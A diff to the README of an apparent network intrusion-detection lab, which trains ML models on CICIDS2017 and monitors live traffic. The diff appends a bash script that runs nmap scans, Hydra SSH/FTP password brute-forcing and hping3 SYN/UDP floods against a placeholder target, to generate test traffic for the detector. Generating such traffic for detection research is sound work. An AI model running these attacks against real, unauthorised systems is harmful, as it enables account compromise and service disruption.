@@ -27,12 +27,11 @@ conda activate spark411
 
 ### Check Wireshark dumpcap
 ```powershell
-& "C:\Program Files\Wireshark\dumpcap.exe" -D
+dumpcap -D
 ```
 
-### Add WinDump folder to PATH for current PowerShell session
+### Check WinDump 
 ```powershell
-$env:Path += ";C:\Tools\WinDump"
 where.exe tcpdump
 where.exe windump
 ```
@@ -68,10 +67,6 @@ python src/train_stacking_ensemble.py
 python src/export_confusion_matrices.py
 ```
 
-### Offline inference sanity check
-```powershell
-python src/predict_xgb_inference.py --input dataset/processed/cicids2017_binary_test.csv --name cic_test_inference
-```
 
 ---
 
@@ -89,7 +84,6 @@ python src/live_capture_cicflow_xgb_excel.py `
   --min-attack-flows 1 `
   --max-windows 1
 ```
-
 ### Continuous live monitoring
 ```powershell
 python src/live_capture_cicflow_xgb_excel.py `
@@ -171,3 +165,70 @@ nmap -A <host_ip>
 ```
 
 Use one scan per 30-second window.
+
+
+##### Attack Script ######
+  #!/bin/bash
+
+  # Configuration
+  TARGET_IP="192.168.1.X"  # <--- Change this
+  USER_LIST="/usr/share/wordlists/metasploit/common_users.txt"
+  PASS_LIST="/usr/share/wordlists/metasploit/common_passwords.txt"
+
+  function next_step() {
+      echo -e "\n\e[33m[!] Press [ENTER] to execute the next pattern...\e[0m"
+      read
+  }
+
+  echo -e "\e[36m--- Starting Lab Attack Sequence ---\e[0m"
+
+  # 1. BENIGN_BASELINE
+  echo "Running: BENIGN_BASELINE (Standard Ping)"
+  ping -c 4 $TARGET_IP
+  next_step
+
+  # 2. NMAP_SYN_SCAN
+  echo "Running: NMAP_SYN_SCAN (-sS)"
+  sudo nmap -sS $TARGET_IP
+  next_step
+
+  # 3. NMAP_FULL_PORT_SCAN
+  echo "Running: NMAP_FULL_PORT_SCAN (-p-)"
+  sudo nmap -p- $TARGET_IP
+  next_step
+
+  # 4. NMAP_SERVICE_SCAN
+  echo "Running: NMAP_SERVICE_SCAN (-sV)"
+  sudo nmap -sV $TARGET_IP
+  next_step
+
+  # 5. NMAP_AGGRESSIVE_SCAN
+  echo "Running: NMAP_AGGRESSIVE_SCAN (-A)"
+  sudo nmap -A $TARGET_IP
+  next_step
+
+  # 6. SSH_BRUTEFORCE_PATTERN
+  echo "Running: SSH_BRUTEFORCE (Hydra)"
+  hydra -L $USER_LIST -P $PASS_LIST $TARGET_IP ssh
+  next_step
+
+  # 7. FTP_BRUTEFORCE_PATTERN
+  echo "Running: FTP_BRUTEFORCE (Hydra)"
+  hydra -L $USER_LIST -P $PASS_LIST $TARGET_IP ftp
+  next_step
+
+  # 8. HTTP_FLOOD_PATTERN
+  echo "Running: HTTP_FLOOD (hping3)"
+  # Sends a flood of SYN packets to port 80
+  sudo hping3 --flood -S -p 80 $TARGET_IP --count 5000
+  next_step
+
+  # 9. UDP_FLOOD_PATTERN
+  echo "Running: UDP_FLOOD (hping3)"
+  sudo hping3 --udp --flood $TARGET_IP --count 5000
+
+  echo -e "\n\e[32m[+] All attack patterns completed.\e[0m"
+############
+
+
+
